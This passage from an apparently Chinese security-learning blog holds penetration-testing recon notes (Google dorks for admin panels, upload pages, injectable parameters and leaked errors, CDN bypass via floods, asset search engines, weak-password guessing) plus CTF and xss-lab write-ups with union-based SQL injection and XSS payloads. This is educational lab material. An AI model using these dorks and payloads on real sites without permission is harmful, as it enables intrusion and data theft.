搜索指定的文件类型，如：.bak，.mdb，.inc等</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">filetype</span>:pdf site:``cnblogs.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>info:　　查找指定站点的一些基本信息</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">info:<span class="hljs-string">``</span>www.csdn.net<br></code></pre></td></tr></table></figure><p>inurl:　　URL中包含指定字符的网页</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:java</span> site:``cnblogs.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>Link:　　搜索所有和指定站点做了链接的URL</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">link</span>:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>site:　     搜索某个特定网站中的内容</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">site:<span class="hljs-string">``</span>cnblogs.com<span class="hljs-string">``</span> Python<br></code></pre></td></tr></table></figure><p>+　　把google可能忽略的字列如查询范围。</p><p>​    Python +教程</p><p>​    这个搜索指令会确保搜索结果中必须包含“教程”这个词</p><p>​    </p><p>​    </p><p>-　　作用： 排除包含指定词的结果。</p><p>​    例子：</p><p>​    新加坡 -旅游</p><p>​    这个搜索指令会返回与新加坡相关的结果，但排除包含“旅游”这个词的页       面。</p><p>​    </p><p>​    </p><p>~　　搜索包括同义词的结果  ~开发</p><p>​    这个搜索指令会返回包含“开发”及其同义词的结果，例如“编程”、“建设”       等</p><p>​    </p><p>​    </p><p>.　　单一字符通配符，匹配一个字符。</p><p>​    c.t</p><p>​    这个搜索指令会匹配包含“c.t”模式的词，例如“cat”、“cut”等。</p><p>​    </p><p>​    </p><p>*　 多字符通配符，匹配多个字符</p><p>​    开发*</p><p>​    这个搜索指令会匹配以“开发”开头的词或短语，例如“开发人员”、“开发工     具”、“开发环境”等</p><p>​    </p><p>​    </p><p>“”  精确查询，搜索完全匹配的短语</p><p>​    “Python 编程”</p><p>​    这个搜索指令会返回包含完全匹配“Python 编程”短语的页面，而不是单独    包含“Python”和“编程”的页面。</p><h3 id="2-重要（记忆）"><a href="#2-重要（记忆）" class="headerlink" title="2.重要（记忆）"></a>2.重要（记忆）</h3><h4 id="（1）搜索网站的管理后台："><a href="#（1）搜索网站的管理后台：" class="headerlink" title="（1）搜索网站的管理后台："></a>（1）搜索网站的管理后台：</h4><p>(没必要去搜索像以下类似百度的搜索网站搜了也是白搜)</p><p>在搜索框中输入：</p><p>site:baidu.com intext: 管理 | 后台 | 后台管 </p><p>理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账 </p><p>号 | login | system </p><p>（以上是用来搜索一个网站的正文中是否包含有关键字）</p><p>site:baidu.com inurl:login | admin | manage | manager | admin_login | system | backend</p><p>（以上是用来找在与这个顶级域名相关的且具有关键词的url）   </p><p>site:baidu.com intitle: 管理 | 后台 | 后台管 </p><p>理 | 登陆 | 登录 </p><p>（以上是用来找在标题中有关键字的网站）</p><h4 id="（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）"><a href="#（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）" class="headerlink" title="（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）"></a>（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）</h4><p>site:baidu.com inurl:file | upload</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221504164.png" alt="5f78430f-55e9-481b-88c4-61706a095c07"></p><h4 id="（3）寻找注入口"><a href="#（3）寻找注入口" class="headerlink" title="（3）寻找注入口"></a>（3）寻找注入口</h4><p>site:target.com inurl:php?id&#x3D; | inurl:asp?id&#x3D; | inurl:aspx?id&#x3D; </p><p>（在实际操作中也可以试一试其他的常用参数）</p><h4 id="（3）找目录可能包含敏感文件"><a href="#（3）找目录可能包含敏感文件" class="headerlink" title="（3）找目录可能包含敏感文件"></a>（3）找目录可能包含敏感文件</h4><p>site:baidu.com intitle:index of </p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221504971.png" alt="0dad4db1-69f2-4071-905e-31f7c9dd279f"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505323.png" alt="53beee50-538a-4682-a5e5-b06256b20638"></p><p>该语法用于搜索页面标题中包含“index of”的页面，通常这些页面是公开的目录列表页面，可能包含敏感文件。</p><h4 id="（4）SQl报错信息"><a href="#（4）SQl报错信息" class="headerlink" title="（4）SQl报错信息"></a>（4）SQl报错信息</h4><p>site:baidu.com intext:”sql syntax near” | </p><p>intext:”syntax error has occurred” | </p><p>intext:” incorrect syntax near” | </p><p>intext:”unexpected end of SQL command” | </p><p>intext:”Warning: mysql_connect()” |</p><p>intext:”Warning: mysql_query()” | </p><p>intext:”Warning: pg_connect()” </p><p>查报错信息可能在报错信息中含有有关数据库结构还有版本的敏感信息</p><h4 id="（5）phpinfo"><a href="#（5）phpinfo" class="headerlink" title="（5）phpinfo"></a>（5）phpinfo</h4><p>site:baidu.com ext:php intitle:phpinfo </p><p>（一般的网页是禁用phpinfo的但是可以试一下）</p><h4 id="（6）社会工程学"><a href="#（6）社会工程学" class="headerlink" title="（6）社会工程学"></a>（6）社会工程学</h4><p>site:csdn.com intitle:密码</p><p>（该语法用于搜索包含账号、密码等敏感信息的页面，通常这些页面可能存在信息泄露问题）</p><h4 id="相关的搜索网站"><a href="#相关的搜索网站" class="headerlink" title="相关的搜索网站"></a>相关的搜索网站</h4><p><a href="https://www.cnblogs.com/T0nmap/p/6aba4eadedfaeec4986056826cb32721.html">https://www.cnblogs.com/T0nmap/p/6aba4eadedfaeec4986056826cb32721.html</a></p><p>（以上是一个含有几个重要的搜索引擎的网站建议看一下）</p><h3 id="3-搜索助手"><a href="#3-搜索助手" class="headerlink" title="3.搜索助手"></a>3.搜索助手</h3><p><a href="https://dorks.faisalahmed.me/">漏洞赏金助手</a></p><h2 id="三、查找真实ip"><a href="#三、查找真实ip" class="headerlink" title="三、查找真实ip"></a>三、查找真实ip</h2><h3 id="1-海外ping"><a href="#1-海外ping" class="headerlink" title="1.海外ping"></a>1.海外ping</h3><p>海外ping查询：<a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>从国外的服务器ping的原因：（1）绕过国内的cdn（2）避免本地的网络限制【一般直接在国内直接ping的话因为有cdn所以大概率是没有办法ping到服务器的真实ip的】</p><h3 id="2-域名解析历史"><a href="#2-域名解析历史" class="headerlink" title="2.域名解析历史"></a>2.域名解析历史</h3><p>DNS：<a href="https://site.ip138.com/www.baid.com/">https://site.ip138.com/www.baid.com/</a></p><p>通过找一个域名的dns解析历史可以找到曾经暴露过的真实IP</p><h3 id="3-通过cc攻击得到真实ping"><a href="#3-通过cc攻击得到真实ping" class="headerlink" title="3.通过cc攻击得到真实ping"></a>3.通过cc攻击得到真实ping</h3><p>cc攻击靠的是伪装成合法用户来对于目标网站进行大量访问 </p><p>这个攻击会消耗cdn资源从而有可能会访问到一个网站服务器的真实ip</p><h2 id="四、资产搜索引擎"><a href="#四、资产搜索引擎" class="headerlink" title="四、资产搜索引擎"></a>四、资产搜索引擎</h2><p>一个用于解决各种资产搜索引擎语法的脚本：<a href="https://github.com/ChinaRan0/Asset-syntax-conversion">https://github.com/ChinaRan0/Asset-syntax-conversion</a></p><h3 id="1-360quake"><a href="#1-360quake" class="headerlink" title="1.360quake"></a>1.360quake</h3><p><a href="https://quake.360.net/quake/#/searchResult?searchVal=%E7%99%BE%E5%BA%A6&selectIndex=quake_service&latest=true">https://quake.360.net/quake/#/searchResult?searchVal=%E7%99%BE%E5%BA%A6&amp;selectIndex=quake_service&amp;latest=true</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505920.png" alt="1fb991be-b904-4824-b60c-0fb2ca099d57"></p><h3 id="2-Fofa"><a href="#2-Fofa" class="headerlink" title="2.Fofa"></a>2.Fofa</h3><p><a href="https://fofa.info/">https://fofa.info/</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505919.png" alt="5a72adbc-b002-474c-ae2d-f3156158c2c7"></p><p>Fofa在edusrc收集中着重收集C段资产 </p><p>title&#x3D;”beijing” </p><p>header&#x3D;”elastic” </p><p>body&#x3D;”网络空间测绘” </p><p>fid&#x3D;”sSXXGNUO2FefBTcCLIT&#x2F;2Q&#x3D;&#x3D;” </p><p>domain&#x3D;”qq.com” </p><p>icp&#x3D;”京ICP证030173号” </p><p>js_name&#x3D;”js&#x2F;jquery.js” </p><p>js_md5&#x3D;”82ac3f14327a8b7ba49baa208d4eaa15” </p><p>icon_hash&#x3D;”-247388890” </p><p>ip&#x3D;”220.181.111.1&#x2F;24” </p><p>country&#x3D;”CN” </p><p>cert&#x3D;”baidu”</p><p><strong>局域网（私有网络）地址</strong>：</p><ul><li>A类：10.0.0.0 到 10.255.255.255</li><li>B类：172.16.0.0 到 172.31.255.255</li><li>C类：192.168.0.0 到 192.168.255.255</li></ul><p><strong>公网（公共网络）地址</strong>：</p><ul><li>A类：1.0.0.0 到 9.255.255.255 和 11.0.0.0 到 126.255.255.255</li><li>B类：128.0.0.0 到 172.15.255.255 和 172.32.0.0 到 191.255.255.255</li><li>C类：192.0.0.0 到 192.167.255.255 和 192.169.0.0 到 223.255.255.255</li></ul><h3 id="3-奇安信Hunter"><a href="#3-奇安信Hunter" class="headerlink" title="3.奇安信Hunter"></a>3.奇安信Hunter</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505745.png" alt="04fda72d-5965-47de-b588-12615a60c3ee"></p><h2 id="五、各种搜索引擎汇总"><a href="#五、各种搜索引擎汇总" class="headerlink" title="五、各种搜索引擎汇总"></a>五、各种搜索引擎汇总</h2><p>shodan.io傻蛋平台 -常用 </p><p>google.com -常用 </p><p>wigle.net WIFI定位 </p><p>grep.app 50 万个 git 存储库 </p><p>censys.io 类似于傻蛋平台 -常用 </p><p>hunter.io 查找邮箱 -常用 </p><p>fofa.info FOFA -常用 </p><p>zoomeye.org 钟馗之眼 -常用 </p><p>leakix.net 威胁情报 </p><p>searchcode.com 代码搜索 </p><p>urlscan.io 威胁情报 </p><p>publicwww. com代码搜索 </p><p>crt.sh 证书搜索 -常用 </p><p>vulners.com 漏洞库 </p><p>pulsedive.com 威胁情报</p><h2 id="六、指纹识别-CMS识别"><a href="#六、指纹识别-CMS识别" class="headerlink" title="六、指纹识别 CMS识别"></a>六、指纹识别 CMS识别</h2><p>小工具：TideFinger <a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a> </p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505630.png" alt="d5d9a800-b724-4bd9-b1d4-3472f78a6af6"></p><p>在线潮汐指纹识别：<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p><p>wappalyzer：一个比较方便快捷的浏览器扩展</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506410.png" alt="9abe9c70-c44c-4612-b1a1-0a8af89dcbbc"></p><h2 id="七、JS信息搜集"><a href="#七、JS信息搜集" class="headerlink" title="七、JS信息搜集"></a>七、JS信息搜集</h2><p>因为在js代码中也有可能存在敏感信息</p><p>JSFinderPlus：</p><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。该工具在JSFinder上进行了增强，主要有：</p><ul><li>多线程爬虫，支持深度爬取（爬取提取出的所有URL）</li><li>常见高危目录爆破</li><li>敏感信息（手机号、身份证号码等）识别</li><li>生成html报告，方便验证</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506181.png" alt="7c63e3df-abab-4bd1-acf4-91931b19ccd5"></p><h2 id="八、目录扫描"><a href="#八、目录扫描" class="headerlink" title="八、目录扫描"></a>八、目录扫描</h2><p>7kbscan：</p><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute%EF%BC%88%E5%A5%BD%E7%94%A8%EF%BC%89">https://github.com/7kbstorm/7kbscan-WebPathBrute（好用）</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506062.png" alt="6afb91c7-6ef0-496f-a838-ed649f470e06"></p><p>dirsearch：</p><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><h2 id="九、信息泄露"><a href="#九、信息泄露" class="headerlink" title="九、信息泄露"></a>九、信息泄露</h2><p> gsil-pro:<a href="https://github.com/StarLord777/GSIL_PRO">https://github.com/StarLord777/GSIL_PRO</a></p><p>我感觉这个配置起来比gsil更好配一些因为这个工具会把筛选出来的数据给保存到本地（<strong>注意：如果往Windows上装的话一定要改路径 因为这个保存路径默认在linux的root文件夹下</strong>）</p><p>工具展示：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506539.png" alt="386e2c2f-4676-4025-bb7f-dbe6895c74ea"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221506080.png" alt="e302f1c3-742d-41ce-b714-5db6dcc1c0d1"></p><p><img src="C:/Users/35358/Desktop/c9802906-0240-4dd2-8acd-7f7188282f35.png" alt="c9802906-0240-4dd2-8acd-7f7188282f35"></p><h2 id="十、社会工程学信息收集"><a href="#十、社会工程学信息收集" class="headerlink" title="十、社会工程学信息收集"></a>十、社会工程学信息收集</h2><p> 针对个人：使用社工库查询，钓鱼；</p><p>针对企业：使用企查查，爱企查</p><h2 id="十二、弱口令"><a href="#十二、弱口令" class="headerlink" title="十二、弱口令"></a>十二、弱口令</h2><p><strong>针对有登录框的可以试试弱口令</strong></p><p>工具：超级弱口令检查工具</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql例题</title>
    <link href="/2024/04/25/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/04/25/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="swpuctf-2021-新生赛-easy-sql"><a href="#swpuctf-2021-新生赛-easy-sql" class="headerlink" title="[swpuctf 2021 新生赛]easy_sql"></a>[swpuctf 2021 新生赛]easy_sql</h1><p>进入页面我们可以看到</p><p>让我们输入点东西如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20210829.png" alt="屏幕截图 2024-01-26 210829"></p><p>然后我们可以在url栏上面看到参数是wllm</p><p>然后输入参数wllm&#x3D;1回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20213610.png" alt="屏幕截图 2024-01-26 213610"></p><p>下一步猜测字段输入：</p><p><code>?wllm=1 order by 1 -- asd</code>   1，2，3…依次增加直到页面显示查询不到最终发现是三个字段</p><p>如图：（是查到第四个字段时查不到的结果）</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20220706.png" alt="屏幕截图 2024-01-26 220706"></p><p>下一步获取库名输入：<code>?wllm=100&#39; union select 1,database(),3 -- asd</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20222155.png" alt="屏幕截图 2024-01-26 222155"></p><p>得到库名为：test_db</p><p>下一步获取表名输入：</p><p>?wllm&#x3D;100’union select 1, table_name,3 from information_schema.tables where table_schema&#x3D;’test_db’ limit 0,1 – asd</p><p>回车如图：（依次获取可知共有两个表）</p><p>![屏幕截图 2024-01-26 223839](C:\Users\35358\Pictures\Screenshots\屏幕截图 2024-01-26 223839.png)</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20223849.png" alt="屏幕截图 2024-01-26 223849"></p><p>下一步获取列名输入：</p><p><code>?wllm=100&#39;union select 1, column_name,3 from information_schema.columns where table_schema=&#39;test_db&#39;and table_name=&#39;test_tb&#39;limit 0,1 -- asd</code></p><p>回车如图：（依次获取此表中的列名发现第二个字段便是flag我们直接找它里面的数据即可）</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20224545.png" alt="屏幕截图 2024-01-26 224545"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20224616.png" alt="屏幕截图 2024-01-26 224616"></p><p>下一步直接获取flag中的数据即可</p><p>输入：</p><p><code>?wllm=100&#39; union select 1,flag,3 from test_tb -- asd</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20225025.png" alt="屏幕截图 2024-01-26 225025"></p><p>得到flag将其提交即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-26%20225059.png" alt="屏幕截图 2024-01-26 225059"></p><p>OVER！</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsp xxs</title>
    <link href="/2024/04/25/jsp%20xxs/"/>
    <url>/2024/04/25/jsp%20xxs/</url>
    
    <content type="html"><![CDATA[<h1 id="Jsp"><a href="#Jsp" class="headerlink" title="Jsp"></a>Jsp</h1><h2 id="1-什么是Jsp"><a href="#1-什么是Jsp" class="headerlink" title="1.什么是Jsp"></a>1.什么是Jsp</h2><p>jsp的全称是java servlet page 它就是java的服务器页面</p><p>因为它相对于servlet传回数据的方法比较简单</p><p>Servlet的本质是一个<strong>基于Java的Web组件</strong>，旨在处理HTTP请求并生成HTTP响应</p><h2 id="2-jsp语法"><a href="#2-jsp语法" class="headerlink" title="2.jsp语法"></a>2.jsp语法</h2><p>脚本程序可包含任意的java语句但是在jsp中不能包含任何文本，html标签和jsp元素</p><p>以下是一个示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>Hello World!<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>&lt;%<br>out.println(&quot;你的 IP 地址 &quot; + request.getRemoteAddr());<br>%&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>    pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><p>上述部分可以用来解决中文编码问题 <strong>注：在以上编码中的@符号是用来标识指令的类型例如引入页面指令或属性</strong></p><p>**注意：在jsp语句中不能使用;来结束表达式 **</p><p>&lt;%@ page …%&gt;：定义页面的依赖属性，比如：脚本语言，error页面还有缓存需求</p><p>&lt;%@ include …%&gt;：包含文件</p><p>&lt;%@ taglib …%&gt;：引入标签库的定义也可以自定义标签</p><p>&lt;%–code–%&gt;：jsp注释</p><p>&lt;%! code %&gt;：用于声明变量，方法及初始化</p><p>&lt;%&#x3D; 表达式 %&gt;：字面意思就是用来写表达式的</p><p>&lt;% code %&gt;：就是代码片段脚本程序</p><p>注：jsp脚本程序，jsp声明以及表达式也可以如下表示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp:scriptlet&gt;<br>   代码片段<br>&lt;/jsp:scriptlet&gt;<br></code></pre></td></tr></table></figure><p>&lt;%代表静态 &lt;%常量 </p><p>%&gt;代表静态 %&gt; 常量</p><p>\ ‘在属性中使用的单引号 （两符号之间不存空格）</p><p>\ “在属性中使用的双引号（两符号之间不存空格）</p><p>JSP行为</p><p>jsp行为标签使用XML语法结构来控制servlet引擎。它能够动态插入一个文件，重用JavaBean组件，引导用户去另一个页面，为Java插件产生相关的HTML等等</p><p>行为标签只有一种语法格式，它严格遵守XML标准：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp:action_name attribute=<span class="hljs-string">&quot;value&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left"><strong>语法</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">jsp:include</td><td align="left">用于在当前页面中包含静态或动态资源</td></tr><tr><td align="left">jsp:useBean</td><td align="left">寻找和初始化一个JavaBean组件</td></tr><tr><td align="left">jsp:setProperty</td><td align="left">设置 JavaBean组件的值</td></tr><tr><td align="left">jsp:getProperty</td><td align="left">将 JavaBean组件的值插入到 output中</td></tr><tr><td align="left">jsp:forward</td><td align="left">从一个JSP文件向另一个文件传递一个包含用户请求的request对象</td></tr><tr><td align="left">jsp:plugin</td><td align="left">用于在生成的HTML页面中包含Applet和JavaBean对象</td></tr><tr><td align="left">jsp:element</td><td align="left">动态创建一个XML元素</td></tr><tr><td align="left">jsp:attribute</td><td align="left">定义动态创建的XML元素的属性</td></tr><tr><td align="left">jsp:body</td><td align="left">定义动态创建的XML元素的主体</td></tr><tr><td align="left">jsp:text</td><td align="left">用于封装模板数据</td></tr></tbody></table><h1 id="xss-lab-前四关"><a href="#xss-lab-前四关" class="headerlink" title="xss-lab 前四关"></a>xss-lab 前四关</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>![屏幕截图 2024-03-07 164845](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-03-07 164845.png)</p><p>如图但我们刚进入页面时发现存在一个get传参name&#x3D;test而且与此同时在页面上也出现了test</p><p>下一步我们可以去看看源代码</p><p>如图：<br><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20165258.png" alt="屏幕截图 2024-03-07 165258"></p><p>发现参数竟然直接出现在页面源代码中因此我们可以尝试去插入一段script代码来让其在html中直接被执行</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20165017.png" alt="屏幕截图 2024-03-07 165017"></p><p>payload：<script>alert(1)</script></p><p>回车即可</p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>当我们进入这关时发现这关和上一关看起来加上了搜索框但从url栏中可以看出还是get传参因此我们可以先使用上一关的payload试一下发现不行 然后查看以页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307171829990.png" alt="image-20240307171829990"></p><p>发现特殊字符被编码成html实体</p><p>可以通过查看后端源码去寻找原因 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20172045.png" alt="屏幕截图 2024-03-07 172045"></p><p><code>htmlspecialchars($str)</code> 函数用于将字符串中的特殊字符转换为HTML实体</p><p>但是我们发现我们传入的值在input标签里面并没有发生变化因此我们可以利用闭合从而使我们的script标签发挥作用</p><p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>回车如图：<img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307172849930.png" alt="image-20240307172849930"></p><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>在进行这关之前需要先知道什么是html事件</p><p>当html代码被实体化尖括号和双引号被全部被实体化后那么就无法使输入的<script>代码被执行那么这时便需要我们使用html事件来进行操作</p><p>参考：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p><p>比较详细看完发现此关有很多payload可以解决但是思路都差不都</p><p>看完后开始解题我们可以先试一下Level 1的payload</p><p>顺便看一下源代码什么情况</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-07%20200640.png" alt="屏幕截图 2024-03-07 200640"></p><p>发现被实体化了</p><p>然后我们尝试输入：' onmoseover="alert(1)" '来闭合但是发现不行</p><p>onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</p><p>查看源代码发现双引号全都变了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307211601073.png" alt="image-20240307211601073"></p><p>然后我们去瞅瞅F12 发现我们的单引号变成了双引号这样我们便可以开始构造</p><p>payload：<code>&#39;onmoseover=&#39;alert(1)</code></p><p>回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240307214621791.png" alt="image-20240307214621791"></p><p>其余事件同理</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果不行的话可以尝试加分号</p><p>例： </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;onmouseover=alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>在这一关在刚刚开始时可以尝试去输< > " ' 这些符号</p><p>目的是去看看是否存在实体化输入后查看原代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240308191556043.png" alt="image-20240308191556043"></p><p>由图我们可以发现在标签中除了单引号他们都被实体化</p><p>但是在input标签里只有<>这两个符号消失了在这里我们猜测可能使用到了字符串替换来过滤了<>这两个符号 因为只消失了<>而""却显示正常所以在这里猜测它没有实例体化html字符</p><p>如果不确定可以去瞅瞅后端代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240308192904563.png" alt="image-20240308192904563"></p><p>然后我们可以利用input标签</p><p>使用"进行闭合</p><p>所以 payload："onmouseover=alert('xss');"</p><p>我建议在在我们构造payload的时候习惯性的在语句后加上一个分号这样比较保险</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319101710385.png" alt="image-20240319101710385"></p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>进入这关后我们可以先去尝试看看他实体化了哪些字符 先输入" < 试试</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319103503931.png" alt="image-20240319103503931"></p><p>发现在input标签中都可以到这里我还以为随便闭合一下就ok但是当我输入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alter</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>时如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20103721.png" alt="屏幕截图 